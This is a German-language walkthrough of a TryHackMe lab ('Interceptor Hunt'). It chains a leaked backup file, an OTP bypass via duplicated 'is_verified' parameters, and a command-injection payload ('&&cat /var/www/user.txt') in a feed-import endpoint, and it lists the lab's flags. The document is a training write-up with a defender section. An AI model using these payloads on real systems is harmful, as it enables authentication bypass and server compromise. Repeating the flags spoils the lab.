# TryHackMe Recruit/Interceptor Hunt - Vollständiger Walkthrough

## Ziel der Aufgabe
Du solltest durch Request-Interception/Manipulation (klassisch mit Burp, hier zusätzlich automatisiert mit Python) zwei Werte finden:

1. Flag nach Login als Admin
2. Wert von `/var/www/user.txt`

Ergebnis:

- Admin-Flag: `THM{ADMIN_ACCESS_USING_BURP}`
- `/var/www/user.txt`: `THM{SYSTEM_PWNED_SUCCESSFULLY}`

---

## Umgebung
- Ziel: `http://10.114.136.231/`
- Workspace: `D:\projects\tryhackme`
- Solver-Script: [interceptor_hunt_burp/interceptor_hunt.py](interceptor_hunt_burp/interceptor_hunt.py)

---

## Angriffsweg (High-Level)
Es war eine Kette aus mehreren Schwachstellen:

1. **Information Disclosure** durch exponierte Backup-Datei (`login.php.bak`)
2. **OTP-Bypass** per **Parameter Pollution / Request Tampering** bei `verify_otp.php`
3. **Command Injection** in `import_feed_api.php`

Diese drei Schritte zusammen liefern beide Flags.

---

## Schritt-für-Schritt (genau)

## 1) Basis-Recon und Login-Flow verstehen
Die Login-Seite (`login.php`) sendet per JavaScript an:

- `POST /api_login.php`
- Felder: `email`, `password`

Die API antwortet als JSON, z. B.:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

Das zeigt klar: Nach Passwort kommt noch ein OTP-Schritt.

---

## 2) Backup-Leak finden (entscheidender Hinweis)
Bei Pfadtests wurde `login.php.bak` erreichbar gefunden.

Dort stand im Kommentar:

- Admin-Mail: `admin@mediahub.thm`
- Passwort-Hinweis: `MediaHub + any year`

Damit wurde Admin-Login möglich, z. B. erfolgreich mit:

- `email=admin@mediahub.thm`
- `password=MediaHub2026`

API-Antwort danach:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

---

## 3) OTP-Verifikation analysieren und manipulieren
Normales Verhalten bei falschem OTP:

```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

Manipulierter Request (entscheidend):

```http
POST /verify_otp.php
Content-Type: application/x-www-form-urlencoded

otp=000000&is_verified=true&is_verified=1&is_verified[]=
```

Antwort:

```json
{"ok":true,"message":"OTP verified. Redirecting..."}
```

Danach war `dashboard.php` erreichbar (HTTP 200 statt Redirect auf Login).

### Warum ist das eine Lücke?
Server-seitige OTP-Logik vertraut offenbar unsauber auf Parameterzustand/Typen bei mehrfach gesetzten Feldern (`is_verified`, `is_verified[]`) statt strikt nur serverseitig berechneten OTP-Status zu verwenden.

Das ist eine Form von:

- **HTTP Parameter Pollution (HPP)**
- **Server-Side Validation Flaw / Auth Logic Bypass**

---

## 4) Erste Flag holen (Admin-Flag)
Nach erfolgreichem OTP-Bypass zeigte `dashboard.php` direkt:

- `Flag: THM{ADMIN_ACCESS_USING_BURP}`

Das beantwortet Frage 1.

---

## 5) Zweite Lücke im Dashboard: Feed-Import
Im Dashboard gibt es die Funktion „Import Feed", die an `import_feed_api.php` sendet.

Frontend filtert nur `;`, `&`, `|` im Browser-JS, aber das ist **kein Sicherheitsmechanismus**.
Direkte Requests an den Backend-Endpoint umgehen diese Client-Filter vollständig.

Beobachtung aus Responses (`cmd_output`):
- Das Backend führt intern offenbar einen Shell-`curl`-Befehl aus.
- Damit sind Command-Injection-Muster testbar.

Erfolgs-Payload:

```text
url=http://x&&cat /var/www/user.txt
```

Ergebnis in `cmd_output`:

```text
THM{SYSTEM_PWNED_SUCCESSFULLY}
```

Das ist der Wert von `/var/www/user.txt` und beantwortet Frage 2.

---

## Burp-Variante (manuell, ohne Script)

## A) Admin bis OTP
1. In Burp Intercept aktivieren.
2. Login auf `login.php` absenden.
3. Request zu `api_login.php` mit Admin-Creds senden (`admin@mediahub.thm` / `MediaHub2026`).
4. Prüfen, dass `ok:true` und `redirect:otp.php` kommt.

## B) OTP umgehen
1. OTP-Form normal absenden (egal welche Zahl).
2. Intercepted Request zu `verify_otp.php` bearbeiten.
3. Body ersetzen durch:
   `otp=000000&is_verified=true&is_verified=1&is_verified[]=`
4. Request forwarden.
5. Dashboard öffnen, Flag 1 lesen.

## C) `user.txt` holen
1. Feed-Import im Dashboard auslösen.
2. Request zu `import_feed_api.php` abfangen.
3. `url` auf `http://x&&cat /var/www/user.txt` setzen.
4. Response (`cmd_output`) enthält Flag 2.

---

## Technische Einordnung der Schwachstellen

1. **Backup File Exposure** (`login.php.bak`)
- Kategorie: Information Disclosure / Sensitive Data Exposure
- Impact: Erleichtert Credential Guessing massiv

2. **OTP Auth Bypass via Parameter Pollution**
- Kategorie: Broken Authentication / Logic Flaw
- Impact: MFA/OTP Schutz wirkungslos

3. **Command Injection in Feed Import**
- Kategorie: OS Command Injection
- Impact: Beliebige Server-Kommandos, Dateilesen, potenziell RCE

---

## Wie das Python-Script arbeitet
Siehe [interceptor_hunt_burp/interceptor_hunt.py](interceptor_hunt_burp/interceptor_hunt.py).

Ablauf im Script:

1. Lädt `login.php.bak` und extrahiert Admin-Hinweis
2. Testet Passwortmuster `MediaHub<year>` um aktuelles Jahr
3. Loggt Admin ein (`api_login.php`)
4. Sendet OTP-Bypass-Payload an `verify_otp.php`
5. Liest Admin-Flag aus `dashboard.php`
6. Nutzt Feed-Endpoint für Command Injection
7. Extrahiert `/var/www/user.txt` aus `cmd_output`

---

## Ist das Script universell für andere Aufgaben?
Kurz: **teilweise ja, komplett nein**.

Warum nicht komplett universell:

- Endpunkte heißen oft anders (`verify.php`, `2fa.php`, `api/auth/verify`, ...)
- Parameter heißen anders (`otp`, `code`, `token`, ...)
- Schwachstelle kann eine andere sein (JWT, IDOR, SQLi statt HPP)
- Antworten/Session-Handling unterscheiden sich

Was universell wiederverwendbar ist:

1. **Methodik**
- Recon -> Endpunkt-Mapping -> Request/Response-Analyse -> gezielte Tampering-Tests

2. **Bausteine**
- Leak-Scanner (`*.bak`, `~`, `.old`)
- Auth-Flow-Tester (Login, OTP, Redirect, Session-Checks)
- Tamper-Payload-Bibliothek (HPP, Typkonflikte, Duplicate Params)
- Post-Auth Endpoint-Fuzzer
- Injection-Prober (nur in autorisierten Labs)

3. **Automations-Architektur**
- Modulbasiert statt harte, challenge-spezifische Strings
- Regeln/Signaturen pro Schwachstellentyp

---

## Vorschlag für ein „semi-universelles" Tool
Du kannst ein Framework bauen mit:

- `recon.py`: findet interessante Pfade und Leaks
- `auth_flow.py`: erkennt Login->OTP Workflows
- `tamper_engine.py`: probiert strukturierte Request-Manipulationen
- `post_auth_probes.py`: testet sensible Endpunkte nach Auth
- `extractors.py`: Flag/Secret Extraktion per Regex

So bleibt es für neue THM-Labs schnell anpassbar, ohne jedes Mal komplett neu zu schreiben.

---

## Defender-Perspektive (wie man das verhindert)

1. Keine Backup-Dateien im Webroot (`.bak`, `~`, `.old` blocken)
2. OTP-Status nur serverseitig führen; nie aus Request-Feldern ableiten
3. Strikte Input-Validierung + allowlist für Feed-URLs
4. Niemals User-Input in Shell-Kommandos bauen
5. Wenn Abruf nötig: native HTTP-Library statt Shell-Aufruf
6. Egress-Regeln + Least Privilege auf Host-Ebene

---

## Kurzes Fazit
Die Aufgabe ist ein klassischer Interception-Case:

- mit Burp manuell manipulierbar,
- mit Python reproduzierbar automatisierbar,
- und als Angriffskette besonders lehrreich, weil mehrere kleine Fehler zusammen zur vollständigen Kompromittierung führen.
